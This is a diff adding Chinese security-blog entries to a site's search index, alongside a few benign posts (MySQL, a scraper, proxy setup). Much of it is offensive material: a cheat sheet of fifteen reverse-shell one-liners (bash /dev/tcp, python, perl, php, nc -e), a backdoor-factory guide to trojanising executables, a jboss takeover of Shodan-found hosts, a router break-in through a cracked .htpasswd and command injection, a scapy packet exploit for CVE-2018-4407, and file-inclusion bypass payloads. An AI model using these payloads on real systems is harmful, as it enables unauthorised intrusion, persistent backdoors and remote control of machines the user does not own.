+          <category> python程序设计 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Prevent a worm by updating Remote Desktop Services (CVE-2019-0708)</title>
+      <link href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/"/>
+      <url>/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/</url>
+      
+        <content type="html"><![CDATA[<p>Today Microsoft released fixes for a critical Remote Code Execution vulnerability, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>, in Remote Desktop Services – formerly known as Terminal Services – that affects some older versions of Windows. The Remote Desktop Protocol (RDP) itself is not vulnerable. This vulnerability is pre-authentication and requires no user interaction. In other words, the vulnerability is ‘wormable’, meaning that any future malware that exploits this vulnerability could propagate from vulnerable computer to vulnerable computer in a similar way as the WannaCry malware spread across the globe in 2017. While we have observed no exploitation of this vulnerability, it is highly likely that malicious actors will write an exploit for this vulnerability and incorporate it into their malware. Now that I have your attention, it is important that affected systems are patched as quickly as possible to prevent such a scenario from happening. In response, we are taking the unusual step of providing a security update for all customers to protect Windows platforms, including some out-of-support versions of Windows. Vulnerable in-support systems include Windows 7, Windows Server 2008 R2, and Windows Server 2008. Downloads for in-support versions of Windows can be found in the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Microsoft Security Update Guide</a>. Customers who use an in-support version of Windows and have automatic updates enabled are automatically protected.  Out-of-support systems include Windows 2003 and Windows XP. If you are on an out-of-support version, the best way to address this vulnerability is to upgrade to the latest version of Windows. Even so, we are making fixes available for these out-of-support versions of Windows in <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">KB4500705</a>. Customers running Windows 8 and Windows 10 are not affected by this vulnerability, and it is no coincidence that later versions of Windows are unaffected. Microsoft invests heavily in strengthening the security of its products, often through major architectural improvements that are not possible to backport to earlier versions of Windows. There is partial mitigation on affected systems that have <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732713(v=ws.11)" target="_blank" rel="noopener">Network Level Authentication (NLA)</a> enabled. The affected systems are mitigated against ‘wormable’ malware or advanced malware threats that could exploit the vulnerability, as NLA requires authentication before the vulnerability can be triggered. However, affected systems are still vulnerable to Remote Code Execution (RCE) exploitation if the attacker has valid credentials that can be used to successfully authenticate. It is for these reasons that we strongly advise that all affected systems – irrespective of whether NLA is enabled or not – should be updated as soon as possible. Resources <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Links to downloads for Windows 7, Windows 2008 R2, and Windows 2008</a> <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">Links to downloads for Windows 2003 and Windows XP</a> Simon Pope, Director of Incident Response, Microsoft Security Response Center (MSRC) <strong>____</strong>分割线<strong><strong>__</strong></strong> 我只是个搬运工，别打我</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 威胁情报 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网渗透后门(一)：backdoor-factory</title>
+      <link href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/"/>
+      <url>/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/</url>
+      
+        <content type="html"><![CDATA[<p>前提：拿下一台机器之后，需要持续控制，可以种一个后门 kali里边有一款强大的工具——backdoor-factory，github地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 该软件的原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jmp到代码段，来触发payload。 第一步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor1.jpg" alt="选择一个想要植入后门的exe"> 选择一个想要植入后门的exe，将该exe拷贝至kali 第二步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor2.jpg" alt="检查是否能被植入后门"> 检查是否能被植入后门 第三步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor3.jpg" alt="检查是否有足够空间用于加载后门"> 检查是否有足够空间用于加载后门 第四步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor4.jpg" alt="查看能够使用的payload"> 查看能够使用的payload 第五步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor5.jpg" alt="设置payload"> 设置payload并选择加载payload的位置，上图选择将payload加载在2处 第六步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor6.jpg" alt="msf开启监听"> 攻击机的msf开启监听 第七步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor7.jpg" alt="在靶机中执行带有后门的exe"> 在靶机中执行带有后门的exe 第八步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor8.jpg" alt="接收到shell"> 接收到shell</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>jboss低版本漏洞拿站</title>
+      <link href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/"/>
+      <url>/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/</url>
+      
+        <content type="html"><![CDATA[<p><img src="http://112.74.49.123/wp-content/uploads/2019/01/1.png" alt="在shodan找目标网站-1"> 在shodan找目标网站，我们设定目标为jboss<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/2.png" alt="使用脚本-2"> 打开目标站，确认可以连接<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/3.png" alt="使用脚本-3"> 使用脚本，确认漏洞是否存在<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/4.png" alt="使用脚本-4"> 选择yes，使用exp攻击漏洞<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/5.png" alt="使用脚本-5"> 反弹shell，设置自己的vps开启监听，输入自己的vps的ip和监听port<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/6.png" alt="使用脚本-6"> 接收到shell，并且可正常使用<br>脚本下载方式：<a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a> 该脚本依赖于python2<br>使用方式： 1.安装必要的python库 <code>pip install -r requires.txt</code> 2.执行 <code>python jexboss.py -host http://ip:port</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux下通过脚本自动搭建ss</title>
+      <link href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass/"/>
+      <url>/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass/</url>
+      
+        <content type="html"><![CDATA[<p><code>wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</code> <code>chmod +x shadowsocks-all.sh</code> <code>./shadowsocks-all.sh</code> 先是选择ss方式，这里选1，使用python搭建ss服务 然后设置密码(修改为自己想用的密码)， 设置端口(修改为自己想用的端口)， 之后就加密方式等，一路默认就好 然后Press any key to start…这里，随便按一个键(只要不是ctrl+c/ctrl+z等) 一直等待，直到出现enjoy，上边会有ip,端口,密码,加密方式等，就可以用了</p><blockquote><p>关于脚本的启动</p></blockquote><p>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status</p><blockquote><p>各版本默认配置文件</p></blockquote><p>Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json</p><blockquote><p>卸载方法</p></blockquote><p>若已安装多个版本，则卸载时也需多次运行（每次卸载一种） 使用root用户登录，运行以下命令： ./shadowsocks-all.sh uninstall</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 科学上网 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>飞鱼星路由器从命令注入到getshell</title>
+      <link href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3/"/>
+      <url>/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3/</url>
+      
+        <content type="html"><![CDATA[<p>一个偶然得到一个ip地址，发现8081端口是一个路由器管理界面，叫做飞鱼星。查阅资料知道低版本飞鱼星存在.htpasswd文件，是管理后台登录密码，形如：<a href="http://ip:8081/.htpasswd。" target="_blank" rel="noopener">http://ip:8081/.htpasswd。</a> <img src="http://112.74.49.123/wp-content/uploads/2018/11/1.png" alt=".htpasswd"> 复制.htpasswd，到kali中使用john破解，得到管理后台密码<strong>**</strong>。 <img src="http://112.74.49.123/wp-content/uploads/2018/11/2.png" alt="john破解密码"> 使用admin/<strong>**</strong>登录到管理后台 <img src="http://112.74.49.123/wp-content/uploads/2018/11/3.png" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2018/11/4.png" alt=""> 查看乌云知识库得知飞鱼星存在命令注入漏洞 <img src="http://112.74.49.123/wp-content/uploads/2018/11/7.png" alt="乌云知识库"> 在“系统工具”-&gt;“网络诊断”-&gt;“网络检测”中使用ping检测 <img src="http://112.74.49.123/wp-content/uploads/2018/11/5.png" alt="正常使用"> 命令注入，发现是root用户 <img src="http://112.74.49.123/wp-content/uploads/2018/11/6.png" alt="命令注入"> 通过查看/etc/ssh/sshd_config <img src="http://112.74.49.123/wp-content/uploads/2018/11/8.png" alt="sshd_config"> 发现ssh开在10089端口，并且允许密码登录 通过instruder大牛在github上边发的<a href="https://github.com/instruder/Security/blob/master/research/wifirouter/vul/D-Link/DI-7100(Beat%201022)/%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%BB%9C%E6%A3%80%E6%B5%8B%E5%8A%9F%E8%83%BD%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/exploit.txt" target="_blank" rel="noopener">exp</a>成功连上ssh 但是进了ssh发现shell是busybox的shell，还需要通过pwn获取路由器shell 放一张没有pwn的ssh <img src="http://112.74.49.123/wp-content/uploads/2018/11/9.png" alt="busybox的ssh"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网件 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux反弹shell总结(15种方法)</title>
+      <link href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95/"/>
+      <url>/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>1.1发送文件(公网发内网)</p></blockquote><p>文件发送端：nc -lp 6666 &lt; 文件 文件接收端：nc 发送端ip 发送端端口 &gt; 新文件</p><blockquote><p>1.2发送文件(内网发公网)</p></blockquote><p>文件发送端：nc -lp 6666 &gt; 文件 文件接收端：nc 发送端ip 发送端端口 &lt; 新文件</p><blockquote><p>2.聊天</p></blockquote><p>发送端：nc -lp 6666 接收端：nc 发送端ip 发送端端口</p><blockquote><p>3.1发送shell</p></blockquote><p>发送端(公网服务器)：nc -lvvp 6666 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp; 接收端：nc 发送端ip 发送端端口</p><blockquote><p>3.2反弹shell</p></blockquote><p>接收端：nc -lvvp 6666 发送端(内网网服务器)：nc 接收端ip 接收端端口 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp;</p><blockquote><p>4.bash反弹</p></blockquote><p>接收端(hackip,公网)：nc -lvvp 端口 发送端(受害者)：bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 发送端(受害者)：0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</p><blockquote><p>5.1socat反弹(tcp)</p></blockquote><p>接收端(攻击机)：./socat TCP-LISTEN:端口 - 发送端(靶机)：./socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</p><blockquote><p>5.2socat反弹(udp)</p></blockquote><p>接收端:./socat udp-listen:端口 - 发送端:socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</p><blockquote><p>6.python反弹</p></blockquote><p>接收端(攻击机,外网)：nc -lvvp 端口 发送端(靶机)：python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><blockquote><p>7.PHP反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端：php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p><blockquote><p>8.JAVA反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端： r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</p><blockquote><p>9.perl反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端： perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><blockquote><p>10.ruby反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端： ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</p><blockquote><p>11.telnet反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端： mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</p><blockquote><p>12.lua反弹(安装lua环境：apt-get install lua*)</p></blockquote><p>接收端：nc -lvvp 端口 发送端：lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</p><blockquote><p>13.awk反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端：awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</p><blockquote><p>14.ksh反弹</p></blockquote><p>接收端：nc -lvvp 端口 发送端：ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</p><blockquote><p>15.msfvenom生成各种payload</p></blockquote><p>接收端：nc -lvvp 端口 查找payload：msfvenom -l payload |grep ‘cmd/unix/reverse’ 生成payload：msfvenom -p cmd/unix/reverse_模块 lhost=接收端ip lport=接收端端口 R</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SSH登陆验证绕过漏洞CVE-2018-10933</title>
+      <link href="/2018/11/16/ssh-e7-99-bb-e9-99-86-e9-aa-8c-e8-af-81-e7-bb-95-e8-bf-87-e6-bc-8f-e6-b4-9ecve-2018-10933/"/>
+      <url>/2018/11/16/ssh-e7-99-bb-e9-99-86-e9-aa-8c-e8-af-81-e7-bb-95-e8-bf-87-e6-bc-8f-e6-b4-9ecve-2018-10933/</url>
+      
+        <content type="html"><![CDATA[<p><img src="http://112.74.49.123/wp-content/uploads/2018/11/ssh.png" alt="CVE-2018-10933"> exp：<a href="https://github.com/blacknbunny/libSSH-Authentication-Bypass" target="_blank" rel="noopener">https://github.com/blacknbunny/libSSH-Authentication-Bypass</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CVE-2018-4407(IOS缓冲区溢出漏洞)exp</title>
+      <link href="/2018/11/16/cve-2018-4407ios-e7-bc-93-e5-86-b2-e5-8c-ba-e6-ba-a2-e5-87-ba-e6-bc-8f-e6-b4-9eexp/"/>
+      <url>/2018/11/16/cve-2018-4407ios-e7-bc-93-e5-86-b2-e5-8c-ba-e6-ba-a2-e5-87-ba-e6-bc-8f-e6-b4-9eexp/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p><code>import scapy from scapy.all import *</code> <code>send(IP(dst=&quot;同一局域网内目标Ip&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p>漏洞范围：</p></blockquote><p>运行以下操作系统的设备易受攻击： Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备） Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复） Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复） Apple OS X El Capitan及更早版本：所有设备</p><blockquote><p>防御策略：</p></blockquote><p>1.在macOS防火墙中启用隐藏模式可防止攻击。这个系统设置默认情况下不启用，需要用户手动开启。iOS设备不支持隐藏模式。 2.不接入公共无线网络。触发该漏洞的唯一必要条件是处于同一Wi-Fi网络，该漏洞不支持通过互联网发送恶意数据包而触发。 3.升级到最新版。 利用视频：[embed]<a href="https://v.youku.com/v\_show/id\_XNDA4MjczNTg5Ng==.html\[/embed\]" target="_blank" rel="noopener">https://v.youku.com/v\_show/id\_XNDA4MjczNTg5Ng==.html\[/embed\]</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Iot安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>简书爬虫</title>
+      <link href="/2018/11/03/e7-ae-80-e4-b9-a6-e7-88-ac-e8-99-ab/"/>
+      <url>/2018/11/03/e7-ae-80-e4-b9-a6-e7-88-ac-e8-99-ab/</url>
+      
+        <content type="html"><![CDATA[<p>一个简书的爬虫，可以设定页码，抓取文章标题、简介以及链接 <code>#coding=utf-8 import requests from bs4 import BeautifulSoup m=input(&quot;请输入想要抓取的页码数量:&quot;) for i in range(1,int(m)): url=&quot;https://www.jianshu.com/?page=&quot;+str(i) headers={ &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39;, &#39;Accept&#39;: &#39;text/html, */*; q=0.01&#39;, &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Referer&#39;: &#39;https://www.jianshu.com/&#39;, &#39;X-INFINITESCROLL&#39;: &#39;true&#39;, &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;, &#39;Connection&#39;: &#39;close&#39;, } html=requests.get(url=url,headers=headers) soup = BeautifulSoup(html.text.encode(html.encoding).decode(&#39;utf-8&#39;), &#39;html.parser&#39;) # 以格式化的形式打印html #print(soup.prettify()) titles = soup.find_all(&#39;a&#39;, &#39;title&#39;) titlesp = soup.find_all(&#39;p&#39;, &#39;abstract&#39;) with open(r&quot;./文章简介.txt&quot;,&quot;a&quot;,encoding=&#39;utf-8&#39;) as file: for (title,titlep) in zip(titles,titlesp): file.write(title.string+&#39;\n&#39;) file.write(titlep.string+&#39;\n&#39;) file.write(&quot;https://www.jianshu.com&quot; + title.get(&#39;href&#39;)+&#39;\n\n&#39;)</code> print(“执行完毕，保存在目录：./文章简介.txt”)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python程序设计 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web安全——文件包含漏洞（一）</title>
+      <link href="/2018/07/16/web-e5-ae-89-e5-85-a8-e6-96-87-e4-bb-b6-e5-8c-85-e5-90-ab-e6-bc-8f-e6-b4-9e-ef-bc-88-e4-b8-80-ef-bc-89/"/>
+      <url>/2018/07/16/web-e5-ae-89-e5-85-a8-e6-96-87-e4-bb-b6-e5-8c-85-e5-90-ab-e6-bc-8f-e6-b4-9e-ef-bc-88-e4-b8-80-ef-bc-89/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>文件包含分为本地文件包含和远程文件包含 文件包含源码如下： <code>if(@$_GET[&#39;file&#39;]){ include_once($_GET[&#39;file&#39;]); }</code> 可以进行本地文件包含(LFI) 开启allow_url_include后，可以进行远程文件包含(RFI) 本地文件包含： url形如： <code>http://127.0.0.1/fi/include1.php?file=phpinfo.php</code> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi1-1.png" alt=""> 远程文件包含： url形如： <code>http://127.0.0.1/fi/include1.php?file=http://127.0.0.1/phpinfo.txt</code> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi1-2.png" alt=""> 所包含对象可以是任意文件，执行方式是讲文件内容以php代码来执行</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="常见防御手段及绕过方式："><a href="#常见防御手段及绕过方式：" class="headerlink" title="常见防御手段及绕过方式："></a>常见防御手段及绕过方式：</h3><p><code>if(@$_GET[&#39;file&#39;]){ include_once($_GET[&#39;file&#39;].&quot;.php&quot;); }</code></p><h4 id="防御手段：只允许包含-php文件"><a href="#防御手段：只允许包含-php文件" class="headerlink" title="防御手段：只允许包含.php文件"></a>防御手段：只允许包含.php文件</h4><h6 id="本地文件包含截断"><a href="#本地文件包含截断" class="headerlink" title="本地文件包含截断"></a>本地文件包含截断</h6><p>绕过方式一：%00截断 URL形如：<code>http://127.0.0.1/fi/include2.php?file=phpinfo.txt%00</code> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi2-2.png" alt=""> 绕过方式二：…………………………(Windows下文件名长度不大于256个字节，Linux下文件名长度不大于1024字节) URL形如：<code>http://127.0.0.1/fi/include2.php?file=phpinfo.txt…………………………………………………………………………………………………………………………………………………………………………………………………</code> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi2-3.png" alt=""></p><h6 id="远程文件包含截断-PHP全版本通杀"><a href="#远程文件包含截断-PHP全版本通杀" class="headerlink" title="远程文件包含截断(PHP全版本通杀)"></a>远程文件包含截断(PHP全版本通杀)</h6><p>URL形如：<code>http://127.0.0.1/fi/include2.php?file=http://127.0.0.1/fi/phpinfo.txt?</code> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi2-4.png" alt=""> 原理：？被解释成url中的querystring，可用来在远程文件包含时截断代码中后面内容。</p><h4 id="防御手段：只允许包含指定文件下的文件"><a href="#防御手段：只允许包含指定文件下的文件" class="headerlink" title="防御手段：只允许包含指定文件下的文件"></a>防御手段：只允许包含指定文件下的文件</h4><p><code>if(@$_GET[&#39;file&#39;]){ include_once(&quot;./upload/&quot;.$_GET[&#39;file&#39;]); }</code> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi3-1.png" alt=""> 绕过方式：使用../../../跳出目录限制 URL形如：<a href="http://127.0.0.1/fi/include3.php?file=../../../apache/conf/httpd.conf" target="_blank" rel="noopener">http://127.0.0.1/fi/include3.php?file=../../../apache/conf/httpd.conf</a> <img src="http://112.74.49.123/wp-content/uploads/2018/07/fi3-2.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MYSQL:基础—主键</title>
+      <link href="/2018/05/09/mysql-e5-9f-ba-e7-a1-80-e4-b8-bb-e9-94-ae/"/>
+      <url>/2018/05/09/mysql-e5-9f-ba-e7-a1-80-e4-b8-bb-e9-94-ae/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-什么是主键"><a href="#1-什么是主键" class="headerlink" title="1.什么是主键"></a>1.什么是主键</h3><p>表中的<strong>每一行都应该具有可以唯一标识自己的一列</strong>(或一组列)。而这个承担标识作用的<strong>列称为主键</strong>。 如果没有主键，数据的管理将会十分混乱。比如会存在多条一模一样的记录，删除和修改特定行十分困难。</p><h3 id="2-那些列可以作为主键："><a href="#2-那些列可以作为主键：" class="headerlink" title="2.那些列可以作为主键："></a>2.那些列可以作为主键：</h3><p>任何列都可以作为主键，只要它满足以下条件：</p><blockquote><p>• 任何两行都不具有相同的主键值。就是说这列的值都是互不相同的。 • 每个行都必须具有一个主键值。主键列不允许设置为NULL。 • 主键列的值不允许进行修改和更新。</p></blockquote><h3 id="3-声明主键的方法"><a href="#3-声明主键的方法" class="headerlink" title="3.声明主键的方法"></a><strong>3.声明主键的方法</strong></h3><p><strong>在创建表的时候决定是否有主键</strong>: <strong>1.最简单的：</strong></p><p>CREATE TABLE t1(<br>   id int not null,<br>   name char(20)<br>);</p><p><strong>2.带主键的：</strong></p><p>CREATE TABLE t1(<br>   id int not null primary key,<br>   name char(20)<br>);</p><p><strong>3.带复合主键的：</strong></p><p>CREATE TABLE t1(<br>   id int not null,<br>   name char(20),<br>   primary key (id,name)<br>);</p><p><strong>4.主键自增的：</strong></p><p>create table dd(<br>    id int primary key not null auto_increment,<br>    name varchar(20),<br>    time timestamp default current_timestamp<br>    );</p><p><strong>创建完后再决定主键</strong></p><p>create table t(<br>id int not null,<br>    name varchar(200) not null,<br>    time timestamp default, current_timestamp<br>);<br>alter table t add primary key (id);</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSRF的检测与防御</title>
+      <link href="/2018/05/08/csrf-e7-9a-84-e6-a3-80-e6-b5-8b-e4-b8-8e-e9-98-b2-e5-be-a1/"/>
+      <url>/2018/05/08/csrf-e7-9a-84-e6-a3-80-e6-b5-8b-e4-b8-8e-e9-98-b2-e5-be-a1/</url>
+      
+        <content type="html"><![CDATA[<p><strong>CSRF漏洞检测：</strong> 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。 随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。 以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 <strong>防御CSRF攻击：</strong> 目前防御 CSRF 攻击主要有三种策略： 1.验证 HTTP Referer 字段； 2.在请求地址中添加 token 并验证； 3.在 HTTP 头中自定义属性并验证。   <strong>（1）验证 HTTP Referer 字段</strong> 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站。这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。 然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。我们可以通过burpsuite或者使用浏览器插件(如modify headers)等方式修改refer，这样就可以通过验证，从而进行 CSRF 攻击。 而且使用refer进行验证还存在误报的风险。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 <strong>（2）在请求地址中添加 token 并验证</strong> CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 